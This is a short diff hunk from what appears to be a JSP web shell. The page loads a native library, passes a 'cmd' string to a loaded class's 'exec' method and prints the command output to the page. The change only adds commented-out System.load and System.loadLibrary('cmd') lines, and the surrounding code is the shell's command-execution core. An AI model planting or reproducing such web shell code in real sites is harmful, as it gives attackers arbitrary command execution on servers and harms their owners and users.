@@ -134,6 +134,9 @@
             application.setAttribute("__LOAD_LIB__", true);
         }
 
+//        System.load();
+//        System.loadLibrary("cmd");
+
         String content = (String) commandClass.getMethod("exec", String.class).invoke(null, cmd);
         out.println("<pre>");
         out.println(content);
